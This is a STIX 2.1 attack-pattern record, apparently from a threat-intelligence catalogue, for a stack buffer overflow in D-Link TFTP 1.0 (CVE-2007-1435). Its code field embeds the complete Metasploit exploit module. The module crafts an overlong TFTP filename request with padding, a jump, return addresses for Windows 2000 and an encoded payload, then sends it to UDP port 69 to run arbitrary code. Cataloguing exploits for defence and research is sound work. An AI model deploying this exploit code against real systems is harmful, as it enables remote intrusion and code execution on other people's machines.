{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f4e75050-e9c6-4c0f-b039-b18f3b140842",
    "created": "2024-08-14T16:50:26.291224Z",
    "modified": "2024-08-14T16:50:26.291228Z",
    "name": "D-Link TFTP 1.0 Long Filename Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in D-Link TFTP 1.0. By sending a request for an overly long file name, an attacker could overflow a buffer and execute arbitrary code. For best results use bind payloads with nonx (No NX). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/tftp/dlink_long_filename.rb",
            "external_id": "dlink_long_filename.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2007-1435"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::Udp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'D-Link TFTP 1.0 Long Filename Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in D-Link TFTP 1.0.\n        By sending a request for an overly long file name, an attacker\n        could overflow a buffer and execute arbitrary code. For best results,\n        use bind payloads with nonx (No NX).\n      },\n      'Author'         =>\n        [\n          'LSO <lso[at]hushmail.com>', # Exploit module\n          'aushack', # Refs, stability, targets etc\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2007-1435' ],\n          [ 'OSVDB', '33977' ],\n          [ 'BID', '22923' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          'BadChars' => \"\\x00\",\n          'Compat'   =>\n          {\n            'ConnectionType' => '-reverse',\n          },\n        },\n      'SaveRegisters'  => [ 'ecx', 'eax', 'esi' ],\n      'Platform'       => 'win',\n\n      'Targets'        =>\n        [\n          # Patrick tested OK 20090228\n          ['Windows 2000 SP4 English', { 'Ret' => 0x77e1ccf7 } ], # jmp ebx\n          ['Windows 2000 SP3 English', { 'Ret' => 0x77f8361b } ], # jmp ebx\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2007-03-12',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        Opt::RPORT(69)\n      ], self)\n  end\n\n  def exploit\n    connect_udp\n\n    print_status(\"Trying target #{target.name}...\")\n\n    juju = \"\\x00\\x01\"\n    juju << Rex::Text.rand_text_alpha_upper(581)\n    juju << Rex::Arch::X86.jmp_short(42)\n    juju << Rex::Text.rand_text_alpha_upper(38)\n    juju << [target.ret].pack('V') + payload.encoded\n\n    udp_sock.put(juju)\n\n    handler\n    disconnect_udp\n  end\nend\n",
    "x_mitre_disclosure_date": "2007-03-12",
    "x_mitre_platforms": [
        "win'"
    ]
}